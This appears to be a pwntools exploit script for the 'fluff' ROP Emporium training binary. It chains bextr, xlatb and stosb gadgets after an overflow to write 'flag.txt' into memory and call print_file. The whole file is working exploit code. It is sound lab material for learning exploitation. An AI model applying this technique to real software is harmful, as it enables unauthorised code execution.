#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'fluff')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./fluff_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

padding = b"A" * cyclic_find(0x6161616b)

# 0x00000000004006a3 : pop rdi ; ret
POP_RDI = p64(0x4006a3)
# 0x0000000000400639: stosb byte ptr [rdi], al; ret; 
STOSB = p64(0x400639)
# 0x0000000000400610 : mov eax, 0 ; pop rbp ; ret
ZERO_EAX = p64(0x400610)
# 0x0000000000400628: xlatb; ret;
XLATB = p64(0x400628)

# BEXTR: START := SRC2[7:0];LEN := SRC2[15:8];
# NOT FOUND ON ROPgadget, only on gdb and ropper
# 0x000000000040062a: pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
POP_BEXTR = p64(0x40062a)

# 0x00000000004005e7 : add byte ptr [rcx], al ; pop rbp ; ret
ADD_RCX_AL = p64(0x4005e7)

# 0x00400510    1      6 sym.imp.print_file
PF_ADDR = p64(0x400510)

# rabin2 -z fluff
# 0   0x000006c4 0x004006c4 11  12   .rodata ascii nonexistent
T_ADDR = 0x4006cb - 0x3ef2
X_ADDR = 0x4006c8 - 0x3ef2
# xxd fluff | grep 66
# 000003c0: 006c 6962 666c 7566 662e 736f 005f 5f67  .libfluff.so.__g
# (r2) iS  ->  section is readable
# 0x000003c0   0x7b 0x004003c0   0x7b -r-- 0x2   STRTAB      .dynstr
F_ADDR = 0x4003c4 - 0x3ef2
L_ADDR = 0x4003c5 - 0x3ef2
G_ADDR = 0x4003cf - 0x3ef2
DOT_ADDR = 0x4003c9 - 0x3ef2
# 000005d0: 803d 610a 2000 0075 1755 4889 e5e8 7eff  .=a. ..u.UH...~.
# 0x00000520  0x192 0x00400520  0x192 -r-x 0x6   PROGBITS    .text
A_ADDR = 0x4005d2 - 0x3ef2

# 0x00001028   0x10 0x00601028   0x10 -rw- PROGBITS    .data
DATA_ADDR = 0x601028

payload = padding
# for BEXTR, first 8 bits are position (0x00), next 8 bits are length (0x48)
# PREPARATION
payload += POP_BEXTR + p64(0x4800) + p64(F_ADDR)
payload += ZERO_EAX + p64(0xa5) + XLATB + POP_RDI + p64(DATA_ADDR)
payload += STOSB

# rdx won't change anymore
POP_BEXTR = p64(0x40062b)

# after a stos operation RDI will be incremented by 1
# https://www.felixcloutier.com/x86/stos:stosb:stosw:stosd:stosq
# After the byte, word, or doubleword is transferred from the register to
# the memory location, the (E)DIregister is incremented or decremented
# according to the setting of the DF flag in the EFLAGS register
payload += POP_BEXTR + p64(L_ADDR)
payload += ZERO_EAX + p64(0xa5) + XLATB + STOSB
payload += POP_BEXTR + p64(A_ADDR)
payload += ZERO_EAX + p64(0xa5) + XLATB + STOSB
payload += POP_BEXTR + p64(G_ADDR)
payload += ZERO_EAX + p64(0xa5) + XLATB + STOSB
payload += POP_BEXTR + p64(DOT_ADDR)
payload += ZERO_EAX + p64(0xa5) + XLATB + STOSB
payload += POP_BEXTR + p64(T_ADDR)
payload += ZERO_EAX + p64(0xa5) + XLATB + STOSB
payload += POP_BEXTR + p64(X_ADDR)
payload += ZERO_EAX + p64(0xa5) + XLATB + STOSB
payload += POP_BEXTR + p64(T_ADDR)
payload += ZERO_EAX + p64(0xa5) + XLATB + STOSB
payload += POP_RDI + p64(DATA_ADDR) + PF_ADDR

io = start()

io.recvuntil(b"> ")
io.send(payload)

io.interactive()
